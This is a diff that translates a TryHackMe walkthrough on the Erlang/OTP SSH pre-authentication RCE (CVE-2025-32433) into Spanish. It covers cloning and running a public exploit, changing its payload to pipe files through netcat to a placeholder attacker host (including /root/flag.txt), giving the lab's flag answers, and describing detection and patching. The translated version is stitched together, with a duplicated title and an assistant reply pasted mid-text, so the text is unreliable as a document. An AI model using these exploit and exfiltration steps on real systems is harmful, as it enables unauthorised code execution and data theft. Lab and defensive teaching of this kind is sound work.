@@ -1,38 +1,57 @@
-## Erlang/OTP SSH: CVE-2025-32433
 
-Learn about and exploit Erlang/OTP SSH CVE-2025-32433 in a lab setup.
-IMG: ![alt text](https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356)
-Link: https://tryhackme.com/room/erlangotpsshcve202532433
-```
-Info
-Room Type: walkthrough
-Free Room. Anyone can deploy virtual machines in the room (without being subscribed)!
-Created by: tryhackme,strategos,TactfulTurtle
-245 days ago
-```
+# Erlang/OTP SSH: CVE-2025-32433
 
+Aprende y explota la vulnerabilidad CVE-2025-32433 de Erlang/OTP SSH en un entorno de laboratorio.
 
-## Task 1 Introduction
-Erlang and its companion framework, the Open Telecom Platform (OTP), form a powerful ecosystem for building distributed fault-tolerant systems. Erlang is a programming language designed to build scalable real-time systems that require high availability. Originally, Erlang was developed by Ericsson for telecommunication systems; however, it has evolved over the years to become a solution for various distributed computing challenges.
+<img src="[https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356](https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356)" width="250" alt=" Erlang/OTP SSH">
 
-Erlang is used not only by a large number of companies for product development but also by many universities for research and even teaching. You can learn more about Erlang at their official page(https://www.erlang.org/faq/introduction.html).
+> **Información de la sala**
+> * **Tipo:** Walkthrough (Guía paso a paso)
+> * **Acceso:** Sala gratuita. ¡Cualquiera puede desplegar las máquinas!
+> * **Creado por:** tryhackme, strategos, TactfulTurtle
+> * **Enlace oficial:** [https://tryhackme.com/room/erlangotpsshcve202532433](https://tryhackme.com/room/erlangotpsshcve202532433)
+> 
+> 
 
-OTP is a collection of middleware, libraries, and tools written in Erlang. Although the T in OTP stands for Telecom, OTP has evolved into a general-purpose framework for building distributed applications. In general, projects using Erlang are actually using Erlang along with its libraries, i.e., Erlang/OTP.
+Entendido, he restaurado los bloques de código de la **AttackBox** exactamente como estaban en el original, manteniendo las rutas (`root@attackbox:~#`) y el formato original, pero conservando el resto del documento en español para tu reporte.
 
-The Erlang/OTP SSH is an implementation of the SSH protocol as part of the Erlang OTP. It enables secure shell access and secure file transfers within Erlang-based systems. Recently, CVE-2025-32433(https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2), a critical vulnerability disclosed in the Erlang/OTP SSH implementation that allows unauthenticated remote code execution (RCE). This vulnerability was discovered by researchers from Ruhr University Bochum and has a CVSS score of 10.0 (https://nvd.nist.gov/vuln/detail/CVE-2025-32433 ) as it is considered critical.
+Aquí tienes el Markdown corregido:
 
+# Erlang/OTP SSH: CVE-2025-32433
 
+Aprende y explota la vulnerabilidad Erlang/OTP SSH CVE-2025-32433 en un entorno de laboratorio.
 
-## Task 2 Technical Background and Exploitation
+<img src="[https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356](https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356)" width="250" alt="Erlang/OTP SSH">
 
+> **Info**
+> Room Type: walkthrough
+> Free Room. Anyone can deploy virtual machines in the room (without being subscribed)!
+> Created by: tryhackme,strategos,TactfulTurtle
+> Link: [https://tryhackme.com/room/erlangotpsshcve202532433](https://tryhackme.com/room/erlangotpsshcve202532433)
 
-This vulnerability exists due to Erlang/OTP’s implementation of the SSH protocol, particularly due to handling the connection protocol messages during the pre-authentication phase. According to this technical overview(https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10), SSH message numbers of 80 and higher are reserved for post-authentication. Consequently, if the SSH client sends an SSH message with such numbers before authentication is completed, the SSH server should disconnect them. The vulnerable servers do not enforce this, which gives the attackers plenty of windows to craft their messages and eventually attain unauthorized code execution.
+---
 
-A proof of concept (PoC) exploit code was written by Matthew Keeley(https://platformsecurity.com/blog/CVE-2025-32433-poc) and can be found here(https://github.com/ProDefense/CVE-2025-32433). The exploit works in four stages; the payload is sent in the fourth stage, which executes the attacker’s code before authentication is conducted.
+## Tarea 1: Introducción
 
- Note: Free users cannot access the Internet to download the exploit code to their AttackBox machines. As a result, we suggest that they access CVE-2025-32433.py (https://raw.githubusercontent.com/ProDefense/CVE-2025-32433/refs/heads/main/CVE-2025-32433.py) on their browsers, copy its content, and paste it into a proper file on their running AttackBox machines. Premium and business subscribers can follow the steps shown below directly.
+Erlang y su framework complementario, el Open Telecom Platform (OTP), forman un ecosistema poderoso para construir sistemas distribuidos tolerantes a fallos. Erlang es un lenguaje de programación diseñado para construir sistemas escalables en tiempo real que requieren alta disponibilidad. Originalmente, Erlang fue desarrollado por Ericsson para sistemas de telecomunicaciones; sin embargo, ha evolucionado a lo largo de los años para convertirse en una solución para diversos desafíos de computación distribuida.
 
-You can download the exploit code using git clone on the AttackBox’s terminal, as shown in the terminal below.
+Erlang es utilizado no solo por una gran cantidad de empresas para el desarrollo de productos, sino también por muchas universidades para la investigación e incluso la enseñanza. Puedes obtener más información sobre Erlang en su página oficial ([https://www.erlang.org/faq/introduction.html](https://www.erlang.org/faq/introduction.html)).
+
+OTP es una colección de middleware, librerías y herramientas escritas en Erlang. Aunque la T en OTP significa Telecom, OTP ha evolucionado hasta convertirse en un framework de propósito general para la construcción de aplicaciones distribuidas. En general, los proyectos que utilizan Erlang están usando en realidad Erlang junto con sus librerías, es decir, Erlang/OTP.
+
+Erlang/OTP SSH es una implementación del protocolo SSH como parte de Erlang OTP. Permite el acceso seguro por shell y la transferencia segura de archivos dentro de sistemas basados en Erlang. Recientemente, se divulgó la vulnerabilidad CVE-2025-32433 ([https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2)), una vulnerabilidad crítica en la implementación de Erlang/OTP SSH que permite la ejecución remota de código (RCE) no autenticada. Esta vulnerabilidad fue descubierta por investigadores de la Universidad del Ruhr de Bochum y tiene una puntuación CVSS de 10.0 ([https://nvd.nist.gov/vuln/detail/CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)), ya que se considera crítica.
+
+---
+
+## Tarea 2: Trasfondo Técnico y Explotación
+
+Esta vulnerabilidad existe debido a la implementación del protocolo SSH por parte de Erlang/OTP, particularmente debido al manejo de los mensajes del protocolo de conexión durante la fase de pre-autenticación. Según este resumen técnico ([https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10](https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10)), los números de mensaje SSH de 80 en adelante están reservados para la post-autenticación. En consecuencia, si el cliente SSH envía un mensaje SSH con tales números antes de que se complete la autenticación, el servidor SSH debería desconectarlos. Los servidores vulnerables no imponen esto, lo que da a los atacantes muchas ventanas para diseñar sus mensajes y finalmente lograr la ejecución de código no autorizada.
+
+Un código de explotación de prueba de concepto (PoC) fue escrito por Matthew Keeley ([https://platformsecurity.com/blog/CVE-2025-32433-poc](https://platformsecurity.com/blog/CVE-2025-32433-poc)) y se puede encontrar aquí ([https://github.com/ProDefense/CVE-2025-32433](https://github.com/ProDefense/CVE-2025-32433)). El exploit funciona en cuatro etapas; el payload se envía en la cuarta etapa, que ejecuta el código del atacante antes de que se lleve a cabo la autenticación.
+
+**Nota:** Los usuarios gratuitos no pueden acceder a Internet para descargar el código del exploit a sus máquinas AttackBox. Como resultado, sugerimos que accedan a CVE-2025-32433.py ([https://raw.githubusercontent.com/ProDefense/CVE-2025-32433/refs/heads/main/CVE-2025-32433.py](https://raw.githubusercontent.com/ProDefense/CVE-2025-32433/refs/heads/main/CVE-2025-32433.py)) en sus navegadores, copien su contenido y lo peguen en un archivo adecuado en sus máquinas AttackBox en funcionamiento. Los suscriptores Premium y Business pueden seguir los pasos que se muestran a continuación directamente.
+
+Puedes descargar el código del exploit usando `git clone` en la terminal de la AttackBox, como se muestra en la terminal a continuación.
 
 ```bash
 AttackBox Terminal
@@ -43,8 +62,11 @@ remote: Counting objects: 100% (12/12), done.
 remote: Compressing objects: 100% (10/10), done.
 remote: Total 12 (delta 3), reused 8 (delta 2), pack-reused 0 (from 0)
 Unpacking objects: 100% (12/12), 4.72 KiB | 483.00 KiB/s, done.
+
 ```
-Next, we need to cd into the CVE-2025-32433 and edit the exploit code CVE-2025-32433.py to use our target’s IP address, MACHINE_IP, and port number, 22. The first six lines of the updated file should look like the following.
+
+A continuación, debemos entrar en el directorio `CVE-2025-32433` y editar el código del exploit `CVE-2025-32433.py` para usar la dirección IP de nuestro objetivo, `MACHINE_IP`, y el número de puerto, `22`. Las primeras seis líneas del archivo actualizado deberían verse como las siguientes.
+
 ```bash
 AttackBox Terminal
 root@attackbox ~/CVE-2025-32433# head -n 6 CVE-2025-32433.py
@@ -55,8 +77,11 @@ import time
 HOST = "MACHINE_IP"  # Target IP (change if needed)
 PORT = 22  # Target port (change if needed)
 [...]
+
 ```
-Now, we are ready to run our exploit. Because this is a PoC, the payload is relatively harmless; it creates the file lab.txt with the contents being pwned. We are accessing an Erlang system via SSH; consequently, as you would expect, the payload is written in Erlang language: file:write_file("/lab.txt", <<"pwned">>).. If you want to create a more sophisticated payload, you must also write it in Erlang. Below is an example of the successful exploitation of the target VM.
+
+Ahora, estamos listos para ejecutar nuestro exploit. Debido a que esto es una PoC, el payload es relativamente inofensivo; crea el archivo `lab.txt` con el contenido "pwned". Estamos accediendo a un sistema Erlang a través de SSH; por lo tanto, como es de esperar, el payload está escrito en lenguaje Erlang: `file:write_file("/lab.txt", <<"pwned">>).`. Si deseas crear un payload más sofisticado, también debes escribirlo en Erlang. A continuación se muestra un ejemplo de la explotación exitosa de la VM objetivo.
+
 ```bash
 AttackBox Terminal
 root@attackbox ~/CVE-2025-32433# python3 CVE-2025-32433.py
@@ -68,76 +93,87 @@ root@attackbox ~/CVE-2025-32433# python3 CVE-2025-32433.py
 [✓] Exploit sent! If the server is vulnerable, it should have written to /lab.txt.
 [+] Received response:
 [...]
-```
-Confirming the Vulnerability
-After executing the above exploit code on the attached VM, we would like to confirm that it was successful. This would be trivial if we had access to the system; however, to execute things from the adversary’s perspective, let’s assume that we don’t have such access. We need other ways to check if our file has been created successfully.
-
-One approach to confirm the existence of the /lab.txt file and view its contents is to set a listener on the AttackBox. Let’s listen on port 4444 on the AttackBox using nc -lvp 4444.
 
 ```
+
+### Confirmando la Vulnerabilidad
+
+Después de ejecutar el código del exploit anterior en la VM adjunta, nos gustaría confirmar que tuvo éxito. Esto sería trivial si tuviéramos acceso al sistema; sin embargo, para ejecutar las cosas desde la perspectiva del adversario, asumamos que no tenemos tal acceso. Necesitamos otras formas de comprobar si nuestro archivo se ha creado correctamente.
+
+Un enfoque para confirmar la existencia del archivo `/lab.txt` y ver su contenido es configurar un listener en la AttackBox. Escuchemos en el puerto 4444 en la AttackBox usando `nc -lvp 4444`.
+
+```bash
 AttackBox Terminal
 root@attackbox:~# nc -lvp 4444
 Listening on 0.0.0.0 4444
+
 ```
-Our next step would be to adapt the payload to something more useful. We can replace the Erlang instruction to write a file, file:write_file("/lab.txt", <<"pwned">>)., with another one that sends the contents of the lab.txt file to our listener. In Erlang, os:cmd allows us to run system commands; therefore, we can use os:cmd("cat /lab.txt | nc CONNECTION_IP 4444"). to confirm the existence and contents of the created lab.txt file.
 
-Please remember to add . at the end of each Erlang instruction. In other words, on line 108, command = 'file:write_file("/lab.txt", <<"pwned">>).' should be updated to command='os:cmd("cat /lab.txt | nc CONNECTION_IP 4444").' to pipe lab.txt contents to nc.
+Nuestro siguiente paso sería adaptar el payload a algo más útil. Podemos reemplazar la instrucción de Erlang para escribir un archivo, `file:write_file("/lab.txt", <<"pwned">>).`, con otra que envíe el contenido del archivo `lab.txt` a nuestro listener. En Erlang, `os:cmd` nos permite ejecutar comandos del sistema; por lo tanto, podemos usar `os:cmd("cat /lab.txt | nc CONNECTION_IP 4444").` para confirmar la existencia y el contenido del archivo `lab.txt` creado.
+
+Por favor, recuerda añadir `.` al final de cada instrucción de Erlang. En otras palabras, en la línea 108, `command = 'file:write_file("/lab.txt", <<"pwned">>).'` debe actualizarse a `command='os:cmd("cat /lab.txt | nc CONNECTION_IP 4444").'` para canalizar el contenido de `lab.txt` a `nc`.
+
+**Preguntas:**
+
+* **¿Cuál es la flag oculta en el directorio root?**
+* Payload: `cat /root/flag.txt | nc IP 4444`
+* **Respuesta:** `THM{U57U3P5KnR}`
+
+
+* **¿Cuál es el hostname del sistema?**
+* Usa `hostname`.
+* **Respuesta:** `c7b79fd068ba`
+
+
+
+---
+
+## Tarea 3: Detección
+
+### Detección Basada en Red
+
+El ataque se basa en una capa de implementación del protocolo SSH, por lo que los registros del demonio SSH no proporcionarían evidencia de explotación confiable. Aun así, el ataque puede ser rastreado revisando el tráfico de red, donde se vería el paquete "SSH_MSG_CHANNEL_REQUEST" viniendo de un atacante hacia tu servidor. El paquete contendrá un payload que comienza con la palabra clave "exec" y termina con el comando exacto a ser ejecutado en el objetivo en texto plano.
+
+[https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1745437299719.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1745437299719.png)
+
+Los proveedores de firewalls están implementando gradualmente reglas NIDS/NIPS basadas en los indicadores descritos, y los investigadores están proponiendo alternativas para Suricata. Por ejemplo:
+
+* Regla IPS de FortiGate: [Sitio web de FortiGuard](https://www.fortiguard.com/encyclopedia/ips/57832)
+* Ejemplo de regla IPS para Suricata: [Repositorio de Github](https://github.com/darses/CVE-2025-32433/blob/main/suricata.rules)
+
+### Detección Basada en Host
+
+Además del enfoque NIDS/NIPS, el ataque puede ser detectado en etapas posteriores. Dado que la vulnerabilidad afecta principalmente a dispositivos de red que suelen controlar una red o uno de sus segmentos, los atacantes pueden usar los dispositivos explotados como punto de partida para entrar en tu Active Directory, entorno de producción u otro segmento de red sensible.
+
+**En el dispositivo explotado (Si tienes acceso al sistema de archivos):**
+
+* Cambios inesperados en los archivos o nuevos archivos ejecutables creados después de la divulgación del CVE.
+* Persistencias específicas del SO, como cronjobs para Linux, creados después de la divulgación del CVE.
+* Tráfico de red sospechoso proveniente del dispositivo hacia IPs externas no reconocidas.
+
+**En otros servidores conectados al dispositivo:**
+
+* Inicios de sesión inesperados o escaneos de red desde el dispositivo de red hacia los servidores monitoreados.
+* Problemas de red como errores de conexión, desconfiguraciones de enrutamiento o alta latencia.
+
+---
+
+## Tarea 4: Mitigación
+
+Muchos productos de hardware y software utilizan Erlang/OTP; desafortunadamente, algunos de estos productos tienen su SSH expuesto al mundo exterior. Debes confirmar si el SSH está habilitado en tus productos y si se ve afectado. Las versiones de OTP afectadas por esta vulnerabilidad son todas las versiones anteriores e incluyendo las siguientes:
+
+* OTP-27.3.2
+* OTP-26.2.5.10
+* OTP-25.3.2.19
+
+Los usuarios deben actualizar sus sistemas a una versión parcheada para mitigar este problema. Las versiones parcheadas disponibles son las siguientes:
+
+* OTP-27.3.3
+* OTP-26.2.5.11
+* OTP-25.3.2.20
+
+Se aconseja a los usuarios deshabilitar el servidor SSH si no es factible realizar una actualización. Cuando esto sea imposible, los usuarios deben bloquear el acceso al servidor SSH mediante las reglas de firewall adecuadas.
+
+**Nota:** Si disfrutaste aprendiendo sobre esta vulnerabilidad, te recomendamos que consultes el módulo de Amenazas Recientes ([https://tryhackme.com/module/recent-threats](https://tryhackme.com/module/recent-threats)).
+
  
-
- What is the flag hidden in the root directory?<br>
-    Payload `cat /root/flag.txt | nc IP 4444`.<br>
-    **Answer:** `THM{U57U3P5KnR}`
-
- What is the hostname of the system?<br>
-    Use `hostname`.<br>
-    **Answer:** `c7b79fd068ba`
-	
-	
-## Task 3 Detection
-**Network-Based Detection**
-
-The attack lies on an SSH protocol implementation layer, so SSH daemon logs would not provide you with reliable exploitation evidence. Still, the attack can be traced by reviewing the network traffic, where you would see the "SSH_MSG_CHANNEL_REQUEST" packet coming from an attacker to your server. The packet will contain a payload starting with the "exec" keyword and ending with an exact command to be executed on the target in plaintext.
-
-
-https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1745437299719.png
-
-Firewall vendors are gradually implementing the NIDS/NIPS rules based on the described indicators, and researchers are coming up with Suricata alternatives. For example:
-
-
-FortiGate IPS rule covering the attack: FortiGate Website (https://www.fortiguard.com/encyclopedia/ips/57832)
-
-Example of Suricata IPS rule: Github Repository (https://github.com/darses/CVE-2025-32433/blob/main/suricata.rules)
-
-**Host-Based Detection**
-
-Besides the NIDS/NIPS approach, the attack can be detected at later stages. Since the vulnerability mainly affects network devices that usually control a network or one of its segments, attackers may use the exploited devices as a starting point to enter your Active Directory, production environment, or other sensitive network segment. Thus, you can build your hunts around detecting anomalous activities from the network devices to your servers or workstations. For example:
-
-**On the exploited device (If you have filesystem access)**:
-
-Unexpected file changes or new executable files created after the CVE disclosure
-OS-specific persistences, like cronjobs for Linux, created after the CVE disclosure
-Suspicious network traffic coming from the device to unrecognized external IPs 
-
-**On other servers connected to the device**:
-
-Unexpected logins or network scans from the network device to the monitored servers
-Networking issues like connection errors, routing misconfigurations, or high latency
-
-
-
-## Task 4 Mitigation
-
-Many hardware and software products use Erlang/OTP; unfortunately, some of these products have their SSH exposed to the outside world. You must confirm if SSH is enabled on your products and whether it is affected. The OTP versions affected by this vulnerability are all the versions before and include the following:
-
-OTP-27.3.2
-OTP-26.2.5.10
-OTP-25.3.2.19
-Users should update their systems to a patched version to mitigate this issue. The patched versions available are the following:
-
-OTP-27.3.3
-OTP-26.2.5.11
-OTP-25.3.2.20
-Users are advised to disable the SSH server if an update is not feasible. When this is impossible, users should block access to the SSH server via the proper firewall rules.
-
-Note:
-If you enjoyed learning about this vulnerability, we recommend you check the Recent Threats module(https://tryhackme.com/module/recent-threats).
